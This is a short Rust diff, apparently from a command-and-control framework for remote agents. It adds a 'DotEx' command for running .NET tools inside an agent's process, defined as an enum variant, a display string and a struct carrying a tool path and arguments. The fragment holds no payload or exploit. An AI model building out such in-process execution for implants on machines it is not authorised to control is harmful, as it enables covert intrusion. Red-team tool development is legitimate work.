@@ -48,6 +48,8 @@ pub enum Command {
     RegQuery,
     RegAdd,
     RegDelete,
+    /// Execute dotnet in current process
+    DotEx,
     // This should be totally unreachable; but keeping to make sure we don't get any weird UB, and
     // make sure it is itemised last in the enum
     Undefined,
@@ -183,9 +185,23 @@ impl Display for Command {
             Command::RegDelete => "reg del",
             Command::RmFile => "RmFile",
             Command::RmDir => "RmDir",
+            Command::DotEx => "DotEx",
         };
 
         write!(f, "{choice}")
+    }
+}
+
+#[derive(Serialize, Deserialize, Clone)]
+pub struct DotExInner {
+    /// A partial path to the tool in the /tools mount
+    pub tool_path: String,
+    pub args: Vec<String>,
+}
+
+impl DotExInner {
+    pub fn from(tool_path: String, args: Vec<String>) -> Self {
+        Self { tool_path, args }
     }
 }
 
@@ -221,6 +237,7 @@ pub enum AdminCommand {
     RegDelete(RegQueryInner),
     /// Exports the completed tasks database for an agent.
     ExportDb,
+    DotEx(DotExInner),
     /// Used for dispatching no admin command, but to be handled via a custom route on the C2
     None,
     Undefined,
